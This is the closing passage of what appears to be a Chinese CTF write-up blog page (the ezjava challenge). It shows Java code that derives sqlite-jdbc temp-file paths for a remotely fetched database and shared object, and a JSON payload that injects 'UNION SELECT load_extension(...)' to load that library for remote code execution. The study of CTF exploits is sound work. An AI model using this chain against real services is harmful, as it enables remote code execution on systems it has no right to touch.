+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">App</span>   
+<span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">MalformedURLException</span> <span class="token punctuation">&#123;</span>  
+        <span class="token class-name">String</span> url1 <span class="token operator">=</span> <span class="token string">"http://&lt;server_ip>:&lt;file_port>/sqlite.db"</span><span class="token punctuation">;</span>  
+        <span class="token class-name">String</span> url2 <span class="token operator">=</span> <span class="token string">"http://&lt;server_ip>:&lt;file_port>/ext.so"</span><span class="token punctuation">;</span>  
+        <span class="token class-name">String</span> tmp <span class="token operator">=</span> <span class="token string">"/tmp/sqlite-jdbc-tmp-"</span><span class="token punctuation">;</span>  
+        <span class="token class-name">String</span> db <span class="token operator">=</span> tmp <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>url1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".db"</span><span class="token punctuation">;</span>  
+        <span class="token class-name">String</span> so <span class="token operator">=</span> tmp <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>url2<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".so"</span><span class="token punctuation">;</span>  
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>db<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>so<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>最后利用 sql 注入完成 Sqlite extension 加载实现 RCE</p>
+<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+    <span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"3"</span><span class="token punctuation">,</span>
+    <span class="token property">"url"</span><span class="token operator">:</span><span class="token string">"jdbc:sqlite:file:/tmp/sqlite-jdbc-tmp--&lt;calc_db>.db?enable_load_extension=true"</span><span class="token punctuation">,</span>
+    <span class="token property">"tableName"</span><span class="token operator">:</span><span class="token string">"user UNION SELECT 1,load_extension('/tmp/sqlite-jdbc-tmp--&lt;calc_so>.db');"</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="../2024-%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-writeup/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="../../skill/go-%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#easycms"><span class="toc-text">easycms</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easycms-revenge"><span class="toc-text">easycms_revenge</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Simple-php"><span class="toc-text">Simple_php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ezjava"><span class="toc-text">ezjava</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="../../js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" href="https://github.com/security-s3ven">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://github.com/security-s3ven">Copyright © 2025 s3ven</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="../../js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="../../js/colorscheme.js"></script>
+
+
+
+
+
+        
+
+      </div>
+    </div>
+  </body>
+</html>
